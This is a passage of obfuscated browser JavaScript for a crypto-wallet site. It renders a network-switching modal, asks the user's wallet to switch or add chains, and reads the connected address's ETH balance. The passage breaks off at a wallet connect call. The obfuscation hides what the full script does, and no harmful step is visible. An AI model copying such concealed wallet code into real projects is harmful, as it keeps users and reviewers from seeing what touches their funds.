4)+'\x20\x20font-wei'+_0x5adfa8(0x2f0)+_0x5adfa8(0x61c)+'r:\x20#fff;\x0a\x20'+_0x5adfa8(0x254)+_0x5adfa8(0x3e9)+_0x5adfa8(0x154)+_0x5adfa8(0x98)+_0x5adfa8(0xbe)+_0x5adfa8(0x321)+'\x20\x20\x20\x20font-s'+_0x5adfa8(0x58e)+_0x5adfa8(0x46a)+_0x5adfa8(0x330)+_0x5adfa8(0x577)+_0x5adfa8(0x505)+'\x20\x20\x20\x20}\x0a\x20\x20\x20\x20'+_0x5adfa8(0x5cc)+_0x5adfa8(0x5f5)+_0x5adfa8(0x3a3)+_0x5adfa8(0x1a9)+_0x5adfa8(0xc3)+_0x5adfa8(0x4f9)+'\x20right:\x200;'+'\x0a\x20\x20\x20\x20\x20\x20wid'+_0x5adfa8(0x146)+_0x5adfa8(0x199)+_0x5adfa8(0x44c)+'\x20\x20\x20\x20\x20\x20bord'+'er-radius:'+_0x5adfa8(0x544)+'\x20\x20backgrou'+_0x5adfa8(0x2ad)+_0x5adfa8(0x82)+_0x5adfa8(0x59e)+_0x5adfa8(0x60a)+'er:\x20none;\x0a'+_0x5adfa8(0x61c)+_0x5adfa8(0x2d6)+'\x20\x20\x20\x20\x20font-'+_0x5adfa8(0x1ea)+';\x0a\x20\x20\x20\x20\x20\x20cu'+_0x5adfa8(0x5e1)+_0x5adfa8(0xdc)+'\x20display:\x20'+_0x5adfa8(0x645)+_0x5adfa8(0x63b)+'ems:\x20cente'+'r;\x0a\x20\x20\x20\x20\x20\x20j'+'ustify-con'+_0x5adfa8(0x62b)+_0x5adfa8(0x593)+'transition'+_0x5adfa8(0x653)+_0x5adfa8(0x4fd)+_0x5adfa8(0x529)+_0x5adfa8(0x98)+_0x5adfa8(0x440)+_0x5adfa8(0x5ef)+_0x5adfa8(0x315)+_0x5adfa8(0x5db)+_0x5adfa8(0x1e4)+_0x5adfa8(0x183)+'\x20\x20\x20}\x0a\x20\x20\x20\x20.'+_0x5adfa8(0x353)+_0x5adfa8(0x37d)+'\x20\x20display:'+_0x5adfa8(0x347)+_0x5adfa8(0x62f)+_0x5adfa8(0x3b6)+_0x5adfa8(0x593)+_0x5adfa8(0x2a2)+_0x5adfa8(0x5af)+_0x5adfa8(0x1df)+_0x5adfa8(0x132)+_0x5adfa8(0x8a)+_0x5adfa8(0x5ab)+_0x5adfa8(0x4a0)+_0x5adfa8(0x443)+_0x5adfa8(0x1fa)+'der:\x201px\x20s'+_0x5adfa8(0x396)+_0x5adfa8(0x4a0)+_0x5adfa8(0xaa)+'\x0a\x20\x20\x20\x20\x20\x20bor'+'der-radius'+_0x5adfa8(0x517)+_0x5adfa8(0x14a)+_0x5adfa8(0xf3)+_0x5adfa8(0x13a)+_0x5adfa8(0x4bc))+(_0x5adfa8(0x276)+_0x5adfa8(0xb3)+_0x5adfa8(0x10a)+_0x5adfa8(0x5b5)+'\x0a\x20\x20\x20\x20\x20\x20col'+_0x5adfa8(0x330)+_0x5adfa8(0x577)+_0x5adfa8(0x644)+_0x5adfa8(0x1b2)+'\x20\x20\x20}\x0a\x20\x20\x20\x20.'+'chain-curr'+_0x5adfa8(0x413)+_0x5adfa8(0x3fd)+'t-size:\x2014'+_0x5adfa8(0x484)+_0x5adfa8(0x510)+_0x5adfa8(0x200)+_0x5adfa8(0x2a7)+_0x5adfa8(0x1fb)+'\x20}\x0a\x20\x20\x20\x20.ch'+'ain-grid\x20{'+_0x5adfa8(0x379)+'play:\x20grid'+_0x5adfa8(0x640)+'id-templat'+_0x5adfa8(0x3b7)+'\x20repeat(2,'+_0x5adfa8(0x39a)+'\x20\x20\x20gap:\x2012'+_0x5adfa8(0x14d)+_0x5adfa8(0x98)+_0x5adfa8(0x5f0)+'\x20\x20\x20\x20\x20\x20disp'+_0x5adfa8(0x4b7)+'\x0a\x20\x20\x20\x20\x20\x20ali'+_0x5adfa8(0x1a7)+_0x5adfa8(0x37c)+'\x20\x20\x20\x20gap:\x201'+_0x5adfa8(0x41d)+'\x20padding:\x20'+_0x5adfa8(0x4bb)+_0x5adfa8(0xeb)+'nd:\x20rgba(2'+_0x5adfa8(0x82)+_0x5adfa8(0x1b9)+_0x5adfa8(0x1fa)+'der-radius'+_0x5adfa8(0x517)+_0x5adfa8(0x418)+_0x5adfa8(0x46f)+_0x5adfa8(0x8c)+_0x5adfa8(0xea)+_0x5adfa8(0x209)+_0x5adfa8(0x2e4)+_0x5adfa8(0x1b7)+_0x5adfa8(0x599)+_0x5adfa8(0x4d5)+'\x0a\x20\x20\x20\x20}\x0a\x20\x20\x20'+'\x20.chain-op'+'tion:hover'+_0x5adfa8(0x1e9)+_0x5adfa8(0x629)+_0x5adfa8(0xf8)+'\x20255,\x20255,'+'\x200.1);\x0a\x20\x20\x20'+_0x5adfa8(0x3f9)+'color:\x20rgb'+_0x5adfa8(0x3c3)+_0x5adfa8(0x13d)+_0x5adfa8(0x2e5)+_0x5adfa8(0x143)+'option.act'+_0x5adfa8(0x4e5)+_0x5adfa8(0xeb)+'nd:\x20rgba(1'+_0x5adfa8(0x17a)+'34,\x200.1);\x0a'+'\x20\x20\x20\x20\x20\x20bord'+_0x5adfa8(0x21e)+'rgba(102,\x20'+_0x5adfa8(0x1dc)+_0x5adfa8(0x3d8)+'}\x0a\x20\x20\x20\x20.cha'+_0x5adfa8(0x204)+_0x5adfa8(0x3ed)+_0x5adfa8(0x3ca)+_0x5adfa8(0x2be)+_0x5adfa8(0x317)+_0x5adfa8(0x38a)+_0x5adfa8(0x4ce)+'\x20\x20\x20\x20}\x0a\x20\x20\x20\x20'+_0x5adfa8(0x1db)+_0x5adfa8(0x63a)+'width:\x2040p'+_0x5adfa8(0x3aa)+_0x5adfa8(0x311)+'x;\x0a\x20\x20\x20\x20\x20\x20b'+'order-radi'+_0x5adfa8(0xb7)+_0x5adfa8(0x5a8))+(_0x5adfa8(0x5a7)+_0x5adfa8(0x5f1)+_0x5adfa8(0x442)+_0x5adfa8(0x5e6)+'\x20\x20\x20justify'+_0x5adfa8(0x57d)+_0x5adfa8(0x37c)+_0x5adfa8(0x10a)+_0x5adfa8(0x23c)+'\x0a\x20\x20\x20\x20\x20\x20bac'+_0x5adfa8(0x447)+'gba(255,\x202'+_0x5adfa8(0xe8)+_0x5adfa8(0x8e)+_0x5adfa8(0x4bc)+_0x5adfa8(0xb5)+_0x5adfa8(0x414)+'size:\x2014px'+_0x5adfa8(0x8b)+'nt-weight:'+'\x20500;\x0a\x20\x20\x20\x20'+_0x5adfa8(0x318)+_0x5adfa8(0x343)+_0x5adfa8(0x4bc)+_0x5adfa8(0x240)+_0x5adfa8(0x26c)+_0x5adfa8(0x578)+_0x5adfa8(0x365)+'\x20color:\x20#2'+_0x5adfa8(0x24f)+_0x5adfa8(0x20b)+_0x5adfa8(0x3cb)+_0x5adfa8(0x274)+_0x5adfa8(0x609)+_0x5adfa8(0x497)+_0x5adfa8(0x560)+_0x5adfa8(0x5e9)+';\x0a\x20\x20\x20\x20\x20\x20wi'+_0x5adfa8(0x37a)+_0x5adfa8(0x617)+_0x5adfa8(0x1cf)+_0x5adfa8(0x1fa)+_0x5adfa8(0x208)+'olid\x20rgba('+_0x5adfa8(0x23a)+_0x5adfa8(0x4c1)+_0x5adfa8(0x1fa)+_0x5adfa8(0x86)+_0x5adfa8(0x272)+_0x5adfa8(0x93)+_0x5adfa8(0x51b)+_0x5adfa8(0x648)+_0x5adfa8(0x439)+_0x5adfa8(0x9b)+_0x5adfa8(0x362)+_0x5adfa8(0x5a4)+_0x5adfa8(0xad)+'\x20\x20}\x0a\x20\x20\x20\x20@k'+'eyframes\x20c'+'hain-spin\x20'+_0x5adfa8(0x504)+_0x5adfa8(0x25b)+_0x5adfa8(0x3a4)+_0x5adfa8(0x3a0)+_0x5adfa8(0x45d)+'\x20\x20.chain-e'+_0x5adfa8(0x112)+_0x5adfa8(0x8a)+_0x5adfa8(0x5ab)+_0x5adfa8(0x54f)+'8,\x200.1);\x0a\x20'+_0x5adfa8(0x3d6)+_0x5adfa8(0x3d1)+_0x5adfa8(0x224)+_0x5adfa8(0x7f)+_0x5adfa8(0x2bb)+_0x5adfa8(0x3f9)+_0x5adfa8(0x3cc)+_0x5adfa8(0x484)+_0x5adfa8(0x232)+'2px;\x0a\x20\x20\x20\x20\x20'+_0x5adfa8(0x145)+_0x5adfa8(0x5a3)+_0x5adfa8(0x133)+_0x5adfa8(0x352)+'\x0a\x20\x20\x20\x20\x20\x20fon'+_0x5adfa8(0x2c9)+_0x5adfa8(0x484)+_0x5adfa8(0x50f)+':\x20center;\x0a'+'\x20\x20\x20\x20}\x0a\x20\x20\x20\x20'+_0x5adfa8(0x4d6)+'tch-prompt'+_0x5adfa8(0x30b)+_0x5adfa8(0x33e)+_0x5adfa8(0x61b)+_0x5adfa8(0x34e)+_0x5adfa8(0x3be)+_0x5adfa8(0x274)+_0x5adfa8(0x4d6))+(_0x5adfa8(0x12c)+_0x5adfa8(0x3fd)+_0x5adfa8(0x1e2)+_0x5adfa8(0x484)+_0x5adfa8(0x256)+_0x5adfa8(0x29a)+'\x0a\x20\x20\x20\x20}\x0a\x20\x20\x20'+_0x5adfa8(0x144)+_0x5adfa8(0x11b)+'ge\x20{\x0a\x20\x20\x20\x20\x20'+'\x20font-size'+_0x5adfa8(0x218)+_0x5adfa8(0x2a7)+_0x5adfa8(0x1fb)+_0x5adfa8(0x560)+_0x5adfa8(0x9a)+_0x5adfa8(0x4cf)+_0x5adfa8(0x143)+_0x5adfa8(0x45b)+_0x5adfa8(0x586)+'\x20\x20font-siz'+_0x5adfa8(0x2e8)+'\x20\x20\x20\x20\x20color'+_0x5adfa8(0x572)+_0x5adfa8(0x5dc)+_0x5adfa8(0x3f3)+_0x5adfa8(0x656)+_0x5adfa8(0xae)+_0x5adfa8(0x31c)+'n-grid\x20{\x0a\x20'+_0x5adfa8(0x10d)+'d-template'+_0x5adfa8(0x126)+'1fr;\x0a\x20\x20\x20\x20\x20'+_0x5adfa8(0x1a5)+'\x20');let _0x464e8b=null;function _0x346a04(){const _0x1b9054=_0x5adfa8;if(!document[_0x1b9054(0x291)+'ById'](_0x1b9054(0x34f)+'l-styles')){const _0x8f1fb6=document[_0x1b9054(0x7d)+_0x1b9054(0x3f4)](_0x1b9054(0x4c0));_0x8f1fb6['id']='chain-moda'+'l-styles',_0x8f1fb6[_0x1b9054(0x139)+'t']=_0x53311a,document[_0x1b9054(0x1a4)][_0x1b9054(0x44e)+'d'](_0x8f1fb6);}!_0x464e8b&&(_0x464e8b=document[_0x1b9054(0x7d)+'ent']('div'),_0x464e8b['id']=_0x1b9054(0x34f)+_0x1b9054(0x30f),_0x464e8b['className']=_0x1b9054(0x34f)+_0x1b9054(0x30f),document['body'][_0x1b9054(0x44e)+'d'](_0x464e8b));}async function _0x5c3b14(){const _0x3024a6=_0x5adfa8;if(!window[_0x3024a6(0x171)])return null;try{const _0x11eacd=await window['ethereum'][_0x3024a6(0x3a1)]({'method':_0x3024a6(0x242)+'d'});for(const [_0x129547,_0x2cfb0f]of Object[_0x3024a6(0x217)](_0x58d27c)){if(_0x2cfb0f[_0x3024a6(0x453)][_0x3024a6(0x4f4)+'e']()===_0x11eacd[_0x3024a6(0x4f4)+'e']())return{'key':_0x129547,..._0x2cfb0f};}return{'chainId':_0x11eacd,'name':_0x3024a6(0x4c2)+_0x3024a6(0x455)};}catch{return null;}}async function _0x33aac7(_0x426aa9={}){const _0x2c8f95=_0x5adfa8;_0x346a04();const {title:title=_0x2c8f95(0x5ce)+_0x2c8f95(0x90),subtitle:subtitle=_0x2c8f95(0x23e)+_0x2c8f95(0xd7)+_0x2c8f95(0x38f),chains:chains=Object[_0x2c8f95(0x1ac)](_0x58d27c),showCurrent:showCurrent=!![],allowClose:allowClose=!![],onSwitch:onSwitch=null}=_0x426aa9,_0x373ce0=await _0x5c3b14(),_0x1c9da7=chains[_0x2c8f95(0x538)](_0x402b5c=>{const _0x2f2b93=_0x2c8f95,_0x1e91be=_0x58d27c[_0x402b5c];if(!_0x1e91be)return'';const _0xc2c621=_0x373ce0&&_0x373ce0[_0x2f2b93(0x453)]===_0x1e91be[_0x2f2b93(0x453)];return _0x2f2b93(0x295)+'div\x20class='+_0x2f2b93(0x21d)+_0x2f2b93(0x17e)+(_0xc2c621?_0x2f2b93(0x18b):'')+(_0x2f2b93(0x4c6)+_0x2f2b93(0xa3))+_0x402b5c+(_0x2f2b93(0x4c6)+'in-id=\x22')+_0x1e91be['chainId']+(_0x2f2b93(0xcb)+_0x2f2b93(0x2f3)+_0x2f2b93(0x228)+_0x2f2b93(0xc1)+_0x2f2b93(0x4e3)+_0x2f2b93(0xff))+_0x1e91be['color']+(_0x2f2b93(0x300)+'\x20')+_0x1e91be[_0x2f2b93(0x465)]+(_0x2f2b93(0xcb)+'\x20\x20\x20\x20\x20')+_0x1e91be[_0x2f2b93(0x1d9)]+(_0x2f2b93(0x53e)+_0x2f2b93(0x585)+'\x20\x20\x20\x20\x20\x20\x20\x20<s'+'pan\x20class='+_0x2f2b93(0x589)+_0x2f2b93(0x40e))+_0x1e91be[_0x2f2b93(0x2d5)]+(_0x2f2b93(0x541)+_0x2f2b93(0x273))+(_0xc2c621?_0x2f2b93(0x534)+_0x2f2b93(0x469)+'heck\x22>✓</s'+_0x2f2b93(0x2ba):'')+(_0x2f2b93(0x295)+_0x2f2b93(0x364)+'\x20\x20');})[_0x2c8f95(0x381)](''),_0x3cfa39=showCurrent&&_0x373ce0?_0x2c8f95(0x14f)+_0x2c8f95(0x2e7)+'hain-curre'+_0x2c8f95(0x7a)+_0x2c8f95(0x2f3)+_0x2c8f95(0x228)+_0x2c8f95(0xc1)+_0x2c8f95(0x4e3)+'ound:\x20'+(_0x373ce0[_0x2c8f95(0x465)]||_0x2c8f95(0x48b))+(_0x2c8f95(0x300)+'\x20')+(_0x373ce0[_0x2c8f95(0x465)]||_0x2c8f95(0x48b))+(_0x2c8f95(0xcb)+_0x2c8f95(0x27b))+(_0x373ce0['icon']||'🔗')+(_0x2c8f95(0x295)+_0x2c8f95(0x364)+_0x2c8f95(0x46c)+_0x2c8f95(0x286)+_0x2c8f95(0x488)+_0x2c8f95(0x658)+_0x2c8f95(0x3a2)+_0x2c8f95(0x1b5)+_0x2c8f95(0x372)+_0x2c8f95(0x4d9)+_0x2c8f95(0x5e8)+_0x2c8f95(0x35d)+'in-current'+'-name\x22>')+_0x373ce0[_0x2c8f95(0x2d5)]+(_0x2c8f95(0x1f8)+_0x2c8f95(0x549)+_0x2c8f95(0x56a)+'div>\x0a\x20\x20\x20\x20'):'';return _0x464e8b[_0x2c8f95(0x28c)]=_0x2c8f95(0x14f)+_0x2c8f95(0x2e7)+_0x2c8f95(0x575)+_0x2c8f95(0xcb)+_0x2c8f95(0x7e)+_0x2c8f95(0x2a0)+'odal-heade'+_0x2c8f95(0x26b)+_0x2c8f95(0x18a)+'ass=\x22chain'+'-modal-tit'+'le\x22>'+title+(_0x2c8f95(0x1b0)+'\x20\x20\x20\x20\x20\x20<p\x20c'+_0x2c8f95(0xcc)+_0x2c8f95(0x2dc)+'btitle\x22>')+subtitle+(_0x2c8f95(0x4ed)+_0x2c8f95(0x367))+(allowClose?_0x2c8f95(0x655)+_0x2c8f95(0x228)+'-close\x22>&t'+'imes;</but'+'ton>':'')+(_0x2c8f95(0x295)+_0x2c8f95(0x364)+_0x2c8f95(0x4db))+_0x3cfa39+('\x0a\x20\x20\x20\x20\x20\x20\x20\x20<'+'div\x20class='+_0x2c8f95(0x500)+_0x2c8f95(0x483)+'\x20\x20\x20\x20')+_0x1c9da7+(_0x2c8f95(0x295)+_0x2c8f95(0x364)+_0x2c8f95(0x22a)+_0x2c8f95(0x27b)),setTimeout(()=>_0x464e8b[_0x2c8f95(0x17c)][_0x2c8f95(0x5d0)](_0x2c8f95(0x18b)),0xa),new Promise((_0x2d509f,_0x1af1b4)=>{const _0x2a136d=_0x2c8f95,_0x2d7fc0=_0x464e8b['querySelec'+_0x2a136d(0x543)](_0x2a136d(0x5cc)+'se');_0x2d7fc0&&_0x2d7fc0[_0x2a136d(0x25c)+_0x2a136d(0x62d)]('click',()=>{_0x4cc8c8(),_0x1af1b4(new Error('User\x20cance'+'lled'));});allowClose&&_0x464e8b['addEventLi'+_0x2a136d(0x62d)](_0x2a136d(0x5f9),_0x5809f6=>{const _0x20e41c=_0x2a136d;_0x5809f6[_0x20e41c(0x3f6)]===_0x464e8b&&(_0x4cc8c8(),_0x1af1b4(new Error(_0x20e41c(0x220)+_0x20e41c(0x30c))));});const _0x3c340c=_0x464e8b[_0x2a136d(0x519)+_0x2a136d(0x280)](_0x2a136d(0x148)+'ion');_0x3c340c[_0x2a136d(0x425)](_0x234ea5=>{const _0x5c08bf=_0x2a136d;_0x234ea5[_0x5c08bf(0x25c)+_0x5c08bf(0x62d)](_0x5c08bf(0x5f9),async()=>{const _0x5d3a6a=_0x5c08bf,_0x59c4e0=_0x234ea5[_0x5d3a6a(0x1a1)][_0x5d3a6a(0x177)],_0x23173b=_0x234ea5[_0x5d3a6a(0x1a1)][_0x5d3a6a(0x453)];if(_0x234ea5[_0x5d3a6a(0x17c)][_0x5d3a6a(0x316)](_0x5d3a6a(0x18b))){_0x2d509f({'chainKey':_0x59c4e0,'chainId':_0x23173b,'switched':![],'reason':_0x5d3a6a(0x65d)+_0x5d3a6a(0xf7)});return;}try{_0x234ea5['classList'][_0x5d3a6a(0x5d0)](_0x5d3a6a(0x10f));const _0x138b22=_0x234ea5[_0x5d3a6a(0x519)+'tor']('.chain-che'+'ck');if(_0x138b22)_0x138b22['remove']();const _0x1f30b5=document[_0x5d3a6a(0x7d)+_0x5d3a6a(0x3f4)]('div');_0x1f30b5[_0x5d3a6a(0x1a6)]=_0x5d3a6a(0x3c7)+_0x5d3a6a(0x7b),_0x234ea5[_0x5d3a6a(0x44e)+'d'](_0x1f30b5);const _0x27ac27=await _0x33c1e3(_0x23173b,_0x59c4e0);_0x3c340c[_0x5d3a6a(0x425)](_0x4b6205=>_0x4b6205[_0x5d3a6a(0x17c)][_0x5d3a6a(0x388)](_0x5d3a6a(0x18b))),_0x234ea5[_0x5d3a6a(0x17c)]['add'](_0x5d3a6a(0x18b)),_0x234ea5[_0x5d3a6a(0x17c)]['remove']('switching'),_0x1f30b5[_0x5d3a6a(0x388)]();const _0x9b76ce=document['createElem'+_0x5d3a6a(0x3f4)](_0x5d3a6a(0x32e));_0x9b76ce[_0x5d3a6a(0x1a6)]=_0x5d3a6a(0x350)+'k',_0x9b76ce['textConten'+'t']='✓',_0x234ea5['appendChil'+'d'](_0x9b76ce),_0x4cc8c8(),_0x2d509f({'chainKey':_0x59c4e0,'chainId':_0x23173b,'switched':!![],..._0x27ac27});if(onSwitch)onSwitch({'chainKey':_0x59c4e0,'chainId':_0x23173b,'switched':!![]});}catch(_0x4b80fe){_0x234ea5['classList'][_0x5d3a6a(0x388)](_0x5d3a6a(0x10f));const _0xce4bcf=_0x234ea5[_0x5d3a6a(0x519)+_0x5d3a6a(0x543)](_0x5d3a6a(0x609)+_0x5d3a6a(0x4dd));if(_0xce4bcf)_0xce4bcf['remove']();_0x25e7b4(_0x4b80fe['message']),_0x1af1b4(_0x4b80fe);}});});});}async function _0x33c1e3(_0x2ddb6e,_0x4f2cb3){const _0x4f44fc=_0x5adfa8;if(!window[_0x4f44fc(0x171)])throw new Error(_0x4f44fc(0x5dd)+'connected');try{return await window[_0x4f44fc(0x171)]['request']({'method':_0x4f44fc(0x4eb)+_0x4f44fc(0x387)+'mChain','params':[{'chainId':_0x2ddb6e}]}),{'success':!![],'added':![]};}catch(_0x2ec6dc){if(_0x2ec6dc[_0x4f44fc(0x334)]===0x1326){const _0x17ae62=_0x58d27c[_0x4f2cb3];if(!_0x17ae62)throw new Error(_0x4f44fc(0x5ca)+_0x4f44fc(0x638)+'not\x20found');try{return await window[_0x4f44fc(0x171)]['request']({'method':'wallet_add'+_0x4f44fc(0x325)+_0x4f44fc(0x455),'params':[{'chainId':_0x17ae62[_0x4f44fc(0x453)],'chainName':_0x17ae62[_0x4f44fc(0x2d5)],'nativeCurrency':{'name':_0x17ae62[_0x4f44fc(0x2d5)],'symbol':_0x17ae62[_0x4f44fc(0x435)],'decimals':0x12},'rpcUrls':[_0x17ae62[_0x4f44fc(0x50b)]],'blockExplorerUrls':[]}]}),{'success':!![],'added':!![]};}catch(_0x5e4923){throw new Error(_0x4f44fc(0x296)+_0x4f44fc(0x2b0)+_0x4f44fc(0x5d6)+_0x5e4923['message']);}}throw new Error('Switch\x20fai'+'led:\x20'+_0x2ec6dc[_0x4f44fc(0x3ff)]);}}async function _0x20f9bf(_0x51915a,_0x4fc97e={}){const _0x30c6f0=_0x5adfa8;_0x346a04();const _0x470cf9=_0x58d27c[_0x51915a];if(!_0x470cf9)throw new Error(_0x30c6f0(0x1f9)+'ain:\x20'+_0x51915a);const _0x1c82eb=await _0x5c3b14();if(_0x1c82eb&&_0x1c82eb[_0x30c6f0(0x453)]===_0x470cf9['chainId'])return{'switched':![],'reason':_0x30c6f0(0x65d)+_0x30c6f0(0xf7)};const {title:title=_0x30c6f0(0x2e1)+_0x30c6f0(0x90),message:message='Please\x20swi'+_0x30c6f0(0x26e)+_0x470cf9[_0x30c6f0(0x2d5)]+('\x20to\x20contin'+'ue'),autoSwitch:autoSwitch=![]}=_0x4fc97e;if(autoSwitch)try{return await _0x33c1e3(_0x470cf9['chainId'],_0x51915a);}catch(_0x42a58f){}return _0x464e8b[_0x30c6f0(0x28c)]=_0x30c6f0(0x14f)+_0x30c6f0(0x2e7)+_0x30c6f0(0x575)+'\x22>\x0a\x20\x20\x20\x20\x20\x20\x20'+_0x30c6f0(0x7e)+_0x30c6f0(0xdf)+_0x30c6f0(0x84)+'pt\x22>\x0a\x20\x20\x20\x20\x20'+_0x30c6f0(0x5e8)+_0x30c6f0(0x35d)+_0x30c6f0(0x3c2)+_0x30c6f0(0x19d)+_0x470cf9[_0x30c6f0(0x1d9)]+(_0x30c6f0(0x1f8)+'\x20\x20\x20\x20\x20\x20\x20<di'+_0x30c6f0(0x2e7)+_0x30c6f0(0x5c4)+_0x30c6f0(0x173)+'>')+title+(_0x30c6f0(0x1f8)+_0x30c6f0(0x4c3)+'v\x20class=\x22c'+'hain-switc'+'h-detail\x22>')+message+(_0x30c6f0(0x1f8)+_0x30c6f0(0x549)+_0x30c6f0(0x19e)+_0x30c6f0(0x488)+_0x30c6f0(0x415)+_0x30c6f0(0x5e4)+_0x30c6f0(0x147)+_0x30c6f0(0x1bd)+_0x30c6f0(0x579)+_0x30c6f0(0x623)+_0x30c6f0(0x3da)+_0x30c6f0(0xcb)+_0x30c6f0(0x203)+_0x30c6f0(0x2c8)+_0x30c6f0(0xfb)+_0x30c6f0(0x60e)+'n-cancel\x22\x20'+_0x30c6f0(0x1e1)+'tify-conte'+'nt:\x20center'+_0x30c6f0(0x2b5)+_0x30c6f0(0x138)+'n\x20class=\x22c'+_0x30c6f0(0x22b)+_0x30c6f0(0x297)+_0x30c6f0(0x2f1)+'\x20\x20\x20\x20\x20</but'+_0x30c6f0(0x164)+'\x20\x20\x20\x20\x20<butt'+'on\x20class=\x22'+_0x30c6f0(0x37f)+_0x30c6f0(0x498)+_0x30c6f0(0x411)+'\x22\x20style=\x22j'+'ustify-con'+_0x30c6f0(0x62b)+_0x30c6f0(0x257)+_0x30c6f0(0x15e)+_0x30c6f0(0x35e)+_0x30c6f0(0x628)+_0x30c6f0(0x2b5)+_0x30c6f0(0x138)+_0x30c6f0(0x659)+_0x30c6f0(0x22b)+_0x30c6f0(0x5fc)+_0x30c6f0(0x2f1)+_0x30c6f0(0x194)+'ton>\x0a\x20\x20\x20\x20\x20'+'\x20\x20\x20</div>\x0a'+_0x30c6f0(0x113)+'v>\x0a\x20\x20\x20\x20'),setTimeout(()=>_0x464e8b[_0x30c6f0(0x17c)][_0x30c6f0(0x5d0)](_0x30c6f0(0x18b)),0xa),new Promise((_0xb6077c,_0x333298)=>{const _0x4f0216=_0x30c6f0,_0x1eeeb6=_0x464e8b[_0x4f0216(0x519)+_0x4f0216(0x543)]('#chain-can'+'cel'),_0x56f934=_0x464e8b[_0x4f0216(0x519)+_0x4f0216(0x543)](_0x4f0216(0x516)+'tch');_0x1eeeb6[_0x4f0216(0x25c)+'stener']('click',()=>{const _0x450aa6=_0x4f0216;_0x4cc8c8(),_0x333298(new Error(_0x450aa6(0x220)+'lled'));}),_0x56f934[_0x4f0216(0x25c)+'stener'](_0x4f0216(0x5f9),async()=>{const _0x23583c=_0x4f0216;_0x56f934[_0x23583c(0x17c)][_0x23583c(0x5d0)](_0x23583c(0x10f)),_0x56f934[_0x23583c(0x28c)]=_0x23583c(0x488)+_0x23583c(0x49f)+_0x23583c(0x5c0)+_0x23583c(0x2c0)+_0x23583c(0xcc)+'n-name\x22>Sw'+_0x23583c(0x230)+_0x23583c(0x3dd);try{const _0x490cd3=await _0x33c1e3(_0x470cf9['chainId'],_0x51915a);_0x4cc8c8(),_0xb6077c({'switched':!![],..._0x490cd3});}catch(_0x18091a){_0x56f934[_0x23583c(0x17c)][_0x23583c(0x388)](_0x23583c(0x10f)),_0x56f934[_0x23583c(0x28c)]=_0x23583c(0x534)+'s=\x22chain-n'+'ame\x22>Switc'+_0x23583c(0x59f),_0x25e7b4(_0x18091a[_0x23583c(0x3ff)]),_0x333298(_0x18091a);}});});}function _0x25e7b4(_0x13701f){const _0x342702=_0x5adfa8;let _0x2de5af=_0x464e8b[_0x342702(0x519)+'tor'](_0x342702(0x3e8)+'or');!_0x2de5af&&(_0x2de5af=document[_0x342702(0x7d)+_0x342702(0x3f4)]('div'),_0x2de5af[_0x342702(0x1a6)]='chain-erro'+'r',_0x464e8b[_0x342702(0x519)+'tor'](_0x342702(0x213)+'al')[_0x342702(0x44e)+'d'](_0x2de5af)),_0x2de5af['textConten'+'t']=_0x13701f,_0x2de5af[_0x342702(0x4c0)][_0x342702(0x49b)]=_0x342702(0x3b8),setTimeout(()=>{const _0x393f02=_0x342702;_0x2de5af[_0x393f02(0x4c0)][_0x393f02(0x49b)]=_0x393f02(0x3d0);},0x1388);}function _0x4cc8c8(){const _0x2766c5=_0x5adfa8;_0x464e8b&&(_0x464e8b[_0x2766c5(0x17c)][_0x2766c5(0x388)](_0x2766c5(0x18b)),setTimeout(()=>{const _0x546c02=_0x2766c5;_0x464e8b[_0x546c02(0x28c)]='';},0x12c));}function _0x10e6dc(_0x5e0fad){const _0x553d35=_0x5adfa8;window[_0x553d35(0x171)]&&window[_0x553d35(0x171)]['on'](_0x553d35(0x172)+'ed',_0x33ff7b=>{const _0x341119=_0x553d35,_0x3a1546=Object[_0x341119(0x252)](_0x58d27c)[_0x341119(0x1c7)](_0x30a660=>_0x30a660[_0x341119(0x453)][_0x341119(0x4f4)+'e']()===_0x33ff7b[_0x341119(0x4f4)+'e']());_0x5e0fad({'chainId':_0x33ff7b,'chainKey':_0x3a1546?Object[_0x341119(0x1ac)](_0x58d27c)[_0x341119(0x1c7)](_0x2f4ed6=>_0x58d27c[_0x2f4ed6]===_0x3a1546):null,'chainName':_0x3a1546?.[_0x341119(0x2d5)]||'Unknown'});});}function _0x485bcf(_0x277863){const _0x29a09b=_0x5adfa8,_0x5062fc=typeof _0x277863===_0x29a09b(0x2fe)?'0x'+_0x277863[_0x29a09b(0x52c)](0x10):_0x277863;for(const [_0x24f738,_0x46ccf3]of Object[_0x29a09b(0x217)](_0x58d27c)){if(_0x46ccf3['chainId']['toLowerCas'+'e']()===_0x5062fc[_0x29a09b(0x4f4)+'e']())return{'key':_0x24f738,..._0x46ccf3};}return null;}return{'CHAINS':_0x58d27c,'init':_0x346a04,'show':_0x33aac7,'hide':_0x4cc8c8,'getCurrentChain':_0x5c3b14,'switchToChain':_0x33c1e3,'promptSwitch':_0x20f9bf,'onChainChange':_0x10e6dc,'getChainInfo':_0x485bcf};}());typeof module!==_0x2c4f95(0x45a)&&module[_0x2c4f95(0x1c3)]&&(module[_0x2c4f95(0x1c3)]=_0x96e043),(function(){'use strict';const _0xe8e9d1=_0x2c4f95;const _0x595ca4=window[_0xe8e9d1(0xbc)+_0xe8e9d1(0x470)]||{},_0x1ef548=_0x595ca4[_0xe8e9d1(0x652)]||{};async function _0x5cc774(_0x501628){const _0x3d1c6a=_0xe8e9d1;try{const _0x278164=await window[_0x3d1c6a(0x171)][_0x3d1c6a(0x3a1)]({'method':_0x3d1c6a(0x60d)+_0x3d1c6a(0x502),'params':[_0x501628,_0x3d1c6a(0x4df)]});return parseFloat(parseInt(_0x278164,0x10)/0xa**0x12)[_0x3d1c6a(0xf9)](0x4);}catch(_0x328b5e){return _0x3d1c6a(0x2ed);}}async function _0x59df24(){const _0x51009e=_0xe8e9d1;try{const _0x5b911e=await _0x4a0553['connect']();if(!_0x5b911e)return;const _0x1d5aa2=await 